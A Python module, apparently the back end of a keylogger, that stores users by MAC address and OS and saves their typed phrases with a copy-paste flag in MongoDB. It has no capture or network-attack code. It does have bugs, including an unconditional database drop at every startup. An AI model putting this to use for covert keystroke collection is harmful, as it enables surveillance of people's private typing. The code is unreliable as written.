import os
from pymongo import MongoClient


def setup_database():
    global db, client

    MONGO_URL = os.environ.get('MONGOHQ_URL')
    if MONGO_URL:
        # Heroku
        client = MongoClient(MONGO_URL)
    else:
        # Local (Development)
        client = MongoClient()
        reset_database()

    reset_database()
    db = client['keylogger']


def reset_database():
    client.drop_database('keylogger')


def get_user_id(user):
    return db.users.find({"mac":user["mac"]})


def get_users_by_os(os):
    return db.users.find({"os": os})


def get_copied_phrases(n=100):
    pipeline = [
        {"$match": {"copy_pastaed": True}},
        {"$group": {"_id":"$phrase"}},
        {"$limit": n}
    ]
    # TODO Andrew: do group by phrase, and aggregate count, and limit to first n
    # results =  db.phrases.find({"copy_pastaed": True})
    return db.phrases.aggregate(pipeline)


def insert_user(user):
    user_dict = user.__dict__
    print("Inserting")
    print(user_dict.keys())
    return db.users.insert_one(user_dict)


def insert_phrases(user, phrases_list):
    for p in phrases_list:
        user_id = get_user_id(user.__dict__)
        if user_id is None:
            print("Bad user id")
        phrase = p.__dict__
        print("Val of cp:")
        print(phrase["copy_pastaed"])
        phrase['user_id'] = str(user_id)
        db.phrases.insert_one(phrase)


def update_user(user):
    db.users.update({"mac": user.mac}, {"$set": user}, upsert=False)


db, client = None, None
